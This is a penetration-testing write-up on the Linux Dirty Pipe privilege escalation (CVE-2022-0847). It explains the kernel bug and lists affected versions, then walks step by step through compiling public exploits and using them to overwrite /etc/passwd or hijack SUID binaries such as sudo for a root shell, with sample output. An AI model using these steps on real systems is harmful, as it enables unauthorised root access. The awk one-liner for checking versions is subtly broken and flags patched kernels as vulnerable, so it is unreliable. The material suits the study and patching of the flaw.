## Dirty Pipe (CVE-2022-0847)

Dirty Pipe is a local privilege escalation vulnerability in the Linux kernel that allows any unprivileged user with read access to a file to overwrite its contents, even if it is read-only. This includes sensitive files like `/etc/passwd` and SUID binaries. 

***

## How It Works

Unix pipes are a mechanism for inter-process communication where data is passed through an in-kernel buffer. The vulnerability stems from the `flags` member of the pipe buffer structure not being properly initialised in the `copy_page_to_iter_pipe` and `push_pipe` kernel functions. 

The exploitation sequence is: 

1. Open a pipe and fill it with data small enough to set the `PIPE_BUF_FLAG_CAN_MERGE` flag on all pipe buffers
2. Drain the pipe (but the flag remains set)
3. Use `splice()` to link a page from a read-only file into the pipe
4. Write to the pipe - the stale `PIPE_BUF_FLAG_CAN_MERGE` flag causes the kernel to merge the write back into the original page cache of the read-only file

The result is an arbitrary write to any file the attacker can read, bypassing all read-only protections. Notably, AppArmor and Seccomp do not prevent this. 

***

## Affected Versions

```
Vulnerable:  Linux kernel >= 5.8
Patched:     Linux kernel >= 5.16.11
                             5.15.25
                             5.10.102
```

Android phones running kernel 5.8+ (Android 12) are also affected. 

```bash
# Check kernel version
uname -r
# 5.13.0-46-generic  <- vulnerable, between 5.8 and 5.16.11

# Quick automated check
uname -r | awk -F'.' '{if ($1>=5 && $2>=8 && $2<17) print "VULNERABLE"; else print "Check manually"}'
```

***

## Exploitation

### Setup

```bash
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
# Produces: exploit-1 and exploit-2
```

If the target has no internet access, compile on a matching kernel and transfer.

***

### exploit-1: /etc/passwd Overwrite

This exploit writes a new root password entry directly into `/etc/passwd`, sets the root password to `piped`, then spawns a root shell and restores the original file. 

```bash
./exploit-1

# Backing up /etc/passwd to /tmp/passwd.bak ...
# Setting root password to "piped"...
# Done! Popping shell...

id
# uid=0(root) gid=0(root) groups=0(root)

# After you are done, the file is automatically restored from /tmp/passwd.bak
# If the script crashes before restoring, restore manually:
cp /tmp/passwd.bak /etc/passwd
```

***

### exploit-2: SUID Binary Hijacking

This exploit overwrites a SUID binary with shellcode that drops a SUID copy of bash into `/tmp`, restores the original binary immediately, then uses the SUID copy for a root shell. 

```bash
# Step 1: Find all SUID binaries
find / -perm -4000 2>/dev/null

# Step 2: Pick any SUID binary and supply the full path as an argument
./exploit-2 /usr/bin/sudo

# [+] hijacking suid binary..
# [+] dropping suid shell..
# [+] restoring suid binary..
# [+] popping root shell.. (dont forget to clean up /tmp/sh ;))

id
# uid=0(root) gid=0(root)

# Clean up the dropped SUID shell when done
rm /tmp/sh
```

Good SUID binary targets include `/usr/bin/sudo`, `/usr/bin/passwd`, `/usr/bin/su`, or any SUID binary in `/usr/sbin`. 

***

## Exploit Payload Size Constraint

The Metasploit module for this CVE documents an important technical limitation that affects custom payloads: 

- The write offset cannot be on a page boundary (4096-byte alignment)
- The write cannot cross a page boundary
- The payload must therefore be smaller than 4096 bytes

Both of the AlexisAhmed PoC exploits work within these constraints. If you are writing a custom payload, keep it under 4096 bytes and do not align it to a page boundary.

***

## Comparison with Dirty COW (CVE-2016-5195)

| | Dirty Pipe (CVE-2022-0847) | Dirty COW (CVE-2016-5195) |
|---|---|---|
| Kernel versions affected | 5.8 to 5.16.11 | 2.6.22 to 4.8.2 |
| Mechanism | Uninitialised pipe buffer flag | Race condition in copy-on-write |
| Reliability | Very high, deterministic | Moderate, race condition timing |
| Risk of system crash | Low | Higher, race can corrupt memory |
| Requires read access | Yes | Yes |
| Android affected | Yes (kernel 5.8+)  [ivanti](https://www.ivanti.com/blog/how-to-mitigate-cve-2022-0847-the-dirty-pipe-vulnerability) | Yes (older versions) |
| Discovered by | Max Kellermann, 2022 | Phil Oester, 2016 |

Dirty Pipe is more reliable than Dirty COW because it does not depend on winning a race condition. The write is deterministic once the pipe state is set up correctly, making it safer to use on production systems. 
